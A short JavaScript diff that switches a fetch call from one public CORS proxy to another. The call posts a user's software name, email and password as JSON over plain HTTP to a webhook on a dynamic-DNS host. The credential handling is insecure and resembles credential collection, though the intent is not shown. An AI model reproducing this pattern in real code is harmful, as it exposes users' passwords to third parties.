@@ -219,7 +219,7 @@
 
       try {
         const target = 'http://zdstudios.duckdns.org:5678/webhook/HW-Bot';
-        const res = await fetch(`https://corsproxy.io/?url=${encodeURIComponent(target)}`, {
+        const res = await fetch(`https://proxy.cors.sh/${target}`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ software, email, password })
